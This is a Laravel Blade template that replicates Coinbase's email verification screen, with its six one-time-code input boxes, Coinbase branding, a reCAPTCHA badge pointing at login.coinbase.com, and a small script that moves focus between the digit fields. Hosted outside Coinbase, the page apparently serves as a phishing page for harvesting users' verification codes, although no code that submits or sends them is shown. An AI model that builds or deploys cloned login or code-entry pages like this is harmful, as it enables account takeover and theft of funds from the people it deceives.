@extends('layouts.app')
@section('content')
  <div id="root" style="display: flex; flex-direction: column; min-height: 100%">
    <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-inverse: rgb(var(--gray100)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue70)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --negative-wash: rgb(var(--red0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray20)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50)); --warning-foreground: rgb(var(--orange70));">
      <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-background-b85wjan" style="min-height: 100vh; width: 100%;">
        <div data-testid="signup-header" class="cds-flex-f1g67tkn cds-center-cv8796s cds-center-ca5ylan cds-space-between-s1vbz1 cds-background-b85wjan cds-4-_1w9a5m cds-4-_q93lq3 cds-3-_1ol1258 cds-3-_1ti0n00" style="width: 100%;">
          <a data-testid="header-logo-link" class="cds-link cds-link-l17zyfmx" href="https://coinbase.com">
            <span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">
              <svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
                <title>Coinbase logo</title>
                <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#000"></path>
              </svg>
            </span>
          </a>
          <button class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-scaledDownState-sxr2bd6 cds-pressableResetStyles-p1yut83c" type="button" style="--interactable-border-radius: 0px; --interactable-background: var(--transparent); --interactable-hovered-background: transparent; --interactable-hovered-opacity: 0.88; --interactable-pressed-background: transparent; --interactable-pressed-opacity: 0.82; --interactable-disabled-background: transparent;">
            <div class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Sign in</div>
          </button>
        </div>
        <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-8-_c4xx9n cds-1-_9w3lns" style="flex-grow: 0; min-height: 100%; width: 100%;">
          <div class="cds-flex-f1g67tkn cds-flex-start-f1lnfmfd cds-row-r1tfxker" style="width: 100%;"></div>
          <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-4-_1w9a5m cds-4-_q93lq3 cds-4-_1arbnhr cds-4-_hd2z08" style="flex-grow: 1; height: 100%; max-width: 448px; min-height: 386px; width: 100%;">
            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
              <div id="view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 463px; width: 100%;">
                <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
                  <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                    <div data-hidden="false" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                      <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp" style="flex-grow: 1; width: 100%;">
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp">
                          <div class="cds-flex-f1g67tkn cds-0-_fibjmj">
                            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_8lqlrb" style="max-width: 100%; overflow-wrap: break-word;">
                              <h1 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-wrap-w1yty5cj">Enter the 6-digit code we emailed you</h1>
                              <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a">Verify your email 
                                <strong class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">test@gmail.com</strong>. This helps us keep your account secure by verifying that it’s really you.</span>
                              </div>
                            </div>
                            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                              <span class="cds-typographyResets-t1xhpuq2 cds-label1-lvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0_5-_uaer6w">Enter code</span>
                              <div data-testid="piroka" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0-_vhy4ik">
                                <div data-testid="code-inputs-container" class="cds-flex-f1g67tkn cds-row-r1tfxker cds-relative-r1fxlug cds-1-_obadkb" role="group" aria-label="numerical code inputs" style="width: 100%; position: relative;">
                                  <div class="cds-flex-f1g67tkn cds-0-_1t4ck38" style="flex-grow: 1; flex-shrink: 1; min-width: 0px; width: 55px;">
                                    <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                        <div class="cds-inputAreaContainerStyles-i1sndg40">
                                          <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                            <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
                                            <input aria-label="6 digit code, digit 1" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:r9:" type="number" inputmode="numeric" autocomplete="one-time-code" value="" style="text-align: center; color-scheme: light;">
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="cds-flex-f1g67tkn cds-0-_1t4ck38" style="flex-grow: 1; flex-shrink: 1; min-width: 0px; width: 55px;">
                                    <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                        <div class="cds-inputAreaContainerStyles-i1sndg40">
                                          <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                            <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
                                            <input aria-label="6 digit code, digit 2" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:ra:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="cds-flex-f1g67tkn cds-0-_1t4ck38" style="flex-grow: 1; flex-shrink: 1; min-width: 0px; width: 55px;">
                                    <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                        <div class="cds-inputAreaContainerStyles-i1sndg40">
                                          <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                            <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
                                            <input aria-label="6 digit code, digit 3" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rb:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="cds-flex-f1g67tkn cds-0-_1t4ck38" style="flex-grow: 1; flex-shrink: 1; min-width: 0px; width: 55px;">
                                    <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                        <div class="cds-inputAreaContainerStyles-i1sndg40">
                                          <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                            <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
                                            <input aria-label="6 digit code, digit 4" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rc:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;"></span>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div class="cds-flex-f1g67tkn cds-0-_1t4ck38" style="flex-grow: 1; flex-shrink: 1; min-width: 0px; width: 55px;">
                                      <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                        <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                          <div class="cds-inputAreaContainerStyles-i1sndg40">
                                            <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                              <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
                                              <input aria-label="6 digit code, digit 5" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rd:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
                                            </span>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div class="cds-flex-f1g67tkn cds-0-_1t4ck38" style="flex-grow: 1; flex-shrink: 1; min-width: 0px; width: 55px;">
                                      <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                        <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                          <div class="cds-inputAreaContainerStyles-i1sndg40">
                                            <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                              <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
                                              <input aria-label="6 digit code, digit 6" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:re:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
                                            </span>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp" style="width: 100%;">
                              <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0-_fibjmj">
                                <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-1-_obadkb">
                                  <button data-testid="cooldown-button" aria-busy="false" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="button" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--secondary); --interactable-hovered-background: rgba(30, 32, 37, 0.07); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37);">
                                    <span class="cds-positionRelative-p109mlw7">
                                      <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a">
                                        <span class="">Resend Code</span>
                                      </span>
                                    </span>
                                  </button>
                                  <button data-testid="go-back-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-primary-piuvss6 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="button" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: transparent; --interactable-disabled-background: rgb(10, 11, 13);">
                                    <span class="cds-positionRelative-p109mlw7">
                                      <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a">
                                        <span class="">Go back</span>
                                      </span>
                                    </span>
                                  </button>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div>
                            <div>
                              <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
                                <div class="grecaptcha-logo">
                                  <iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-glnpif3vv0mf" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6LcTV7IcAAAAAI1CwwRBm58wKn1n6vwyV1QFaoxr&amp;co=aHR0cHM6Ly9sb2dpbi5jb2luYmFzZS5jb206NDQz&amp;hl=en-GB&amp;type=image&amp;v=hfUfsXWZFeg83qqxrK27GB8P&amp;theme=light&amp;size=invisible&amp;badge=bottomright&amp;cb=29yek93m3850"></iframe>
                                </div>
                                <div class="grecaptcha-error"></div>
                                <textarea id="g-recaptcha-response-2" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                              </div>
                              <iframe style="display: none;"></iframe>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div data-testname="hidden-banner" data-testid="banner-container" class="cds-flex-f1g67tkn cds-fixed-f1v5p9l4" style="width: 100%; position: fixed; bottom: -200px; z-index: 3; transition: bottom 500ms; will-change: bottom;">
            <div id="cookie-banner" class="cds-flex-f1g67tkn cds-center-czxavit cds-backgroundAlternate-b1o0kdmt" style="width: 100%;">
              <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-space-between-s1vbz1 cds-3-_1ixgcz3 cds-3-_1mvq9l2 cds-6-_1iifjn6 cds-6-_1ts70zl" style="max-width: 800px; width: 100%;">
                <p class="cds-typographyResets-t1xhpuq2 cds-label2-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0-_vhy4ik cds-1-_7ojgr9">We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our 
                  <a class="cds-link cds-link-l17zyfmx" href="https://coinbase.com/legal/cookie" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">Cookie Policy</span>
                  </a>.
                </p>
                <button data-testid="dismiss-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
                  <span class="cds-positionRelative-p109mlw7">
                    <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a">
                      <span class="">Dismiss</span>
                    </span>
                  </span>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
     @endsection

     @push('script')
      <script>
document.addEventListener("DOMContentLoaded", function() {
    const inputBoxes = document.querySelectorAll(".input-box");

    inputBoxes.forEach((input, index) => {
        input.addEventListener("input", function() {
            if (input.value.length > 1) {
                input.value = input.value.slice(0, 1); // Only allow one digit
            }
            if (input.value.length === 1) {
                if (index < inputBoxes.length - 1 && input.dataset.previousValue === "") {
                    inputBoxes[index + 1].focus();
                } else {
                    input.blur(); // Remove focus from the last input box
                }
            }
            input.dataset.previousValue = input.value;
        });

        input.addEventListener("keydown", function(e) {
            if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
                inputBoxes[index - 1].focus();
            }
        });

        input.addEventListener("keypress", function(e) {
            if (e.which < 48 || e.which > 57) {
                e.preventDefault(); // Restrict input to digits only
            }
        });

        input.addEventListener("focus", function() {
            input.dataset.previousValue = input.value; // Store the previous value on focus
        });
    });
});



      </script>
     @endpush